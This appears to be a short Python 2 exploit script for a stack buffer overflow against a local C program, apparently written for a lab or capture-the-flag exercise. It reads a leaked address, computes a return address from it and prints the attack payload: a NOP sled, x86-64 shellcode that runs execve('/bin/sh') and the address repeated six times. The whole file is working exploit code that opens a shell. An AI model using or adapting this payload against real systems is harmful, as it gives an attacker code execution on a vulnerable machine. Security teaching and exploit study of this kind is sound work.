#read hex input from C program and convert to integer to calucalte offset
name_addr = int(raw_input(),16)
#calculate new offset and convert result to string to ease further processing
offset_addr = str(hex(name_addr + 32))
i=len(offset_addr)-2
addr_str=""
#convert 0x7fd0 to \xd0\x7f
while i>1:
    addr_str+=chr(int(offset_addr[i:i+2],16))
    i-=2
addr_str+=chr(int('0',16))
addr_str+=chr(int('0',16))
print '1234567\0'*2 + '\x90'*80 + '\xeb\x0e\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\xef\x00\x00' + addr_str*6
print '1234567\0'*2
